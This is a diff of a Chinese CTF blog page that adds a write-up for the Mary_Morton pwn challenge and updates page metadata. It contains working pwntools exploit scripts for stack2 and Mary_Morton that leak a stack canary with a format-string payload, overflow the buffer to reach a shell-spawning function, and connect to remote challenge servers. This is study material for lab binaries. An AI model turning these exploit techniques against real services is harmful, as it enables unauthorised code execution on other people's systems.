@@ -94,8 +94,15 @@
 <meta property="og:image" content="https://s2.ax1x.com/2019/08/24/mykjgJ.png">
 <meta property="og:image" content="https://s2.ax1x.com/2019/09/02/nid579.png">
 <meta property="og:image" content="https://s2.ax1x.com/2019/09/03/nk39Ln.png">
-<meta property="og:image" content="c:/Users/chessman/AppData/Roaming/Typora/typora-user-images/1567498815939.png">
-<meta property="og:updated_time" content="2019-09-08T09:11:08.672Z">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/03/nkyO2j.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/18/nH4iX6.jpg">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/18/nH4yEF.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/18/nH5QPJ.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/18/nH5NVO.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/18/nH5fiQ.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/18/nHIEJH.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/19/nLLWXF.png">
+<meta property="og:updated_time" content="2019-09-17T16:00:00.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="攻防世界自闭之路&lt;二&gt;">
 <meta name="twitter:description" content="自古有一就有二，有二也不一定有三。鸽子才是本质。">
@@ -284,6 +291,10 @@
 
         <div class="post-meta">
            
+            <i class="fa fa-thumb-tack"></i>
+            <font color="7D26CD">置顶</font>
+            <span class="post-meta-divider">|</span>
+          
           <span class="post-time">
 		  
               <span class="post-meta-item-icon">
@@ -308,8 +319,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-09-08T17:11:08+08:00">
-                2019-09-08
+              <time title="更新于" itemprop="dateModified" datetime="2019-09-18T00:00:00+08:00">
+                2019-09-18
               </time>
             
           </span>
@@ -336,7 +347,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  748 字
+                  1,234 字
                 </span>
               
 
@@ -352,7 +363,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  3 分钟
+                  5 分钟
                 </span>
               
             </div>
@@ -391,9 +402,31 @@
 <p>一长段代码里面能看到的这个函数的基本功能是一个计算器的菜单格式，漏洞在再次更改之后的地方。程序没有限制这个的大小就能直接跳转函数的地址偏移，也就是说我不管更改哪里的地址在函数中都是可行的。这道题我以为题解看到这里我就能做了，然后我就去做了，漏洞都找到了，就好办了，我是这么想的。</p>
 <p>但是很迷，偏移算不对。理论上来说直接覆盖完栈就可了，直接拿来就算的话就是0x74的值，但是这个不对。题解里面说动态调试，那就现学一波动态调试。ida的动态调试参考<a href="https://blog.csdn.net/abc_670/article/details/80066817" target="_blank" rel="noopener">这篇文章</a> 配置完之后直接用你就能直接动态调试到数据段的值。拿到偏移是0x84，也就是覆盖0x84-0x88的。虽然动态调试了，这个题为什么偏移上的不同还是没有明白。</p>
 <p>函数本身就有/bin/bash值，地址为0x0804859b由于存进内存中之后读取地址是反过来的，地址<code>/0x155/0x133/0x04/0x08</code> 。</p>
-<p> <img src="C:\Users\chessman\AppData\Roaming\Typora\typora-user-images\1567498815939.png" alt></p>
+<p> <img src="https://s2.ax1x.com/2019/09/03/nkyO2j.png" alt></p>
 <p>​    但是在环境中没有/bin/bash。所以直接改成/bin/sh的值。原来的函数段里面就有system的值。直接利用值就行了。这个没得payload写 就直接放exp算了。</p>
 <h2 id="完整exp-1"><a href="#完整exp-1" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"47.96.239.28"</span>, <span class="string">'2333'</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">'1\n5\n3\n132\n80\n3\n133\n132\n3\n134\n4\n3\n135\n8'</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">'3\n140\n135\n3\n141\n137\n3\n142\n4\n3\n143\n8'</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="pwn100"><a href="#pwn100" class="headerlink" title="pwn100"></a>pwn100</h1><blockquote>
+<p>憨憨，是憨憨啊。是一个看不懂怎么写题得憨憨啊</p>
+</blockquote>
+<h1 id="Mary-Morton"><a href="#Mary-Morton" class="headerlink" title="Mary_Morton"></a>Mary_Morton</h1><blockquote>
+<p>有两个漏洞，题目里面都表明了，用其中一个做就做的出，所以我选择容易的格式化字符串漏洞。是的，就是因为我菜到不会绕过canary</p>
+</blockquote>
+<p>真实菜，没做过算64位anary偏移的题，一直觉得应该直接覆盖缓存区就行，其实还有个六个寄存器的偏移，我都没算。</p>
+<p><img src="https://s2.ax1x.com/2019/09/18/nH4iX6.jpg" style="zoom:67%;"></p>
+<h2 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h2><p>拿到题目看保护，没毛病。NX和Canary。用栈溢出不好做（确信）</p>
+<p> <img src="https://s2.ax1x.com/2019/09/18/nH4yEF.png" alt></p>
+<h2 id="ida查看伪代码-1"><a href="#ida查看伪代码-1" class="headerlink" title="ida查看伪代码"></a>ida查看伪代码</h2><p>在代码里面就可以很明显的看见题目提示给的栈溢出和格式化字符串漏洞</p>
+<p> <img src="https://s2.ax1x.com/2019/09/18/nH5QPJ.png" alt></p>
+<p>然后再去代码里面看看漏洞问题</p>
+<p> <img src="https://s2.ax1x.com/2019/09/18/nH5NVO.png" alt="格式化字符串"></p>
+<p> <img src="https://s2.ax1x.com/2019/09/18/nH5fiQ.png" alt="栈溢出"></p>
+<p>其实函数就是这么个函数，就很明显，对吧。但是我们找到了点不一样的，这程序里面有这个！！！直接利用漏洞，地址进入到这个函数就行了。同时得到sys的地址（0x4008da）</p>
+<p><img src="https://s2.ax1x.com/2019/09/18/nHIEJH.png" alt></p>
+<p>然后计算偏移的值，由于我们已知程序有cancry保护，所以我们在绕过cancry偏移的时候可以用字符串漏洞泄露cancry。</p>
+<p><img src="https://s2.ax1x.com/2019/09/19/nLLWXF.png" alt></p>
+<p>偏移地址为5。由于buf的大小为0x90，且canary的值在buf的底部。正常来算偏移值的话应该是(0x90-0x08)/8<code>[（buf的大小-cancry的值）除去64的位数]</code> 但是由于64位运用寄存器传参，导致偏移值为17+6。</p>
+<p>泄露地址之后再去用栈溢出漏洞来交互payload，定位到sub_0x004008da的地址</p>
+<h2 id="完整exp-2"><a href="#完整exp-2" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'111.198.29.45'</span>,<span class="string">'38493'</span>)</span><br><span class="line"><span class="comment"># = process('./Mary_Morton')</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">sys = p64(<span class="number">0x04008DA</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'3. Exit the battle \n'</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendline(<span class="string">"%23$p"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line"></span><br><span class="line">cc = p.recv(<span class="number">16</span>)</span><br><span class="line">c = int(cc,<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(c)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"3. Exit the battle \n"</span>,<span class="string">"1"</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x88</span> + p64(c) + <span class="string">'a'</span>*<span class="number">8</span>  + sys</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -517,7 +550,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-count">7</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -530,7 +563,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-count">4</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -585,7 +618,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#dice-game"><span class="nav-number">1.</span> <span class="nav-text">dice_game</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#检查保护"><span class="nav-number">1.1.</span> <span class="nav-text">检查保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#完整exp"><span class="nav-number">1.2.</span> <span class="nav-text">完整exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#stack2"><span class="nav-number">2.</span> <span class="nav-text">stack2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#检查保护-1"><span class="nav-number">2.1.</span> <span class="nav-text">检查保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ida查看伪代码"><span class="nav-number">2.2.</span> <span class="nav-text">ida查看伪代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#完整exp-1"><span class="nav-number">2.3.</span> <span class="nav-text">完整exp</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#dice-game"><span class="nav-number">1.</span> <span class="nav-text">dice_game</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#检查保护"><span class="nav-number">1.1.</span> <span class="nav-text">检查保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#完整exp"><span class="nav-number">1.2.</span> <span class="nav-text">完整exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#stack2"><span class="nav-number">2.</span> <span class="nav-text">stack2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#检查保护-1"><span class="nav-number">2.1.</span> <span class="nav-text">检查保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ida查看伪代码"><span class="nav-number">2.2.</span> <span class="nav-text">ida查看伪代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#完整exp-1"><span class="nav-number">2.3.</span> <span class="nav-text">完整exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn100"><span class="nav-number">3.</span> <span class="nav-text">pwn100</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Mary-Morton"><span class="nav-number">4.</span> <span class="nav-text">Mary_Morton</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#查看保护"><span class="nav-number">4.1.</span> <span class="nav-text">查看保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ida查看伪代码-1"><span class="nav-number">4.2.</span> <span class="nav-text">ida查看伪代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#完整exp-2"><span class="nav-number">4.3.</span> <span class="nav-text">完整exp</span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -621,7 +654,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">6.5k</span>
+    <span title="Site words total count">7.1k</span>
   
 </div>
 
